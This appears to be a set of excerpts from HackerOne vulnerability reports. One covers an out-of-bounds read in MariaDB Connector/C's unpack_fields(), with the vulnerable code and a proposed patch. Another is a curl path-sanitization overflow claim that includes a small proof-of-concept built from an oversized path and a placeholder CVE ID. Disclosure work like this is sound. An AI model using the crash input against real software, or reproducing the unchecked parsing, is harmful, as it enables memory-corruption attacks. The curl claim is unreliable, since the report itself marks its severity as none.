```
if (msg->length == 0) {
  reason = END_STREAM_REASON_MISC;
}
```

```
c_msg->msg = relay_msg_copy(msg);
```

## #3896671 Connector/C Out-of-bounds read in `unpack_fields()` from short metadata field — mariadb — - — Out-of-bounds Read
Source: `hackerone/reports/2026/3896671.md` (https://hackerone.com/reports/3896671)

```
p= (char *)row->data[i];
/* filler */
field->charsetnr= uint2korr(p);
p+= 2;
field->length= (uint) uint4korr(p);
p+= 4;
field->type= (enum enum_field_types)uint1korr(p);
p++;
field->flags= uint2korr(p);
p+= 2;
field->decimals= (uint) p[0];
p++;
/* filler */
p+= 2;
```

```
if ((len=(ulong) net_field_length(&cp)) == NULL_LENGTH) {
    cur->data[field] = 0;
} else {
    cur->data[field] = to;
    if (len > (ulong)(end_to - to) || to > end_to) {
        free_rows(result);
        ...
        return(0);
    }
    memcpy(to,(char*) cp,len); to[len]=0;
    ...
}
```

```
diff --git a/libmariadb/mariadb_lib.c b/libmariadb/mariadb_lib.c
index 292f1db6..935a1280 100644
--- a/libmariadb/mariadb_lib.c
+++ b/libmariadb/mariadb_lib.c
@@ -1203,6 +1203,18 @@ unpack_fields(const MYSQL *mysql,
     }
 
     p= (char *)row->data[i];
+    /* fixed-header field must hold at least 12 bytes */
+    if (!p)
+      goto error;
+    {
+      size_t field_len;
+      if (i + 1 <= data->fields && row->data[i + 1])
+        field_len= (char *)row->data[i + 1] - p - 1;
+      else
+        field_len= 0;
+      if (field_len < 12)
+        goto error;
+    }
     /* filler */
     field->charsetnr= uint2korr(p);
     p+= 2;
```

## #3804525 Vulnerability Report: Buffer Overflow in Path Sanitization — curl — - — None
Source: `hackerone/reports/2026/3804525.md` (https://hackerone.com/reports/3804525)

```
// Exploit for CVE-2024-XXXX-A
char malicious_path[PATH_MAX + 100] = "C:\\";
memset(malicious_path + 4, 'A', PATH_MAX + 96);
malicious_path[PATH_MAX + 99] = '\0';

char *sanitized;
sanitize_file_name(&sanitized, malicious_path, SANITIZE_ALLOW_PATH);
```

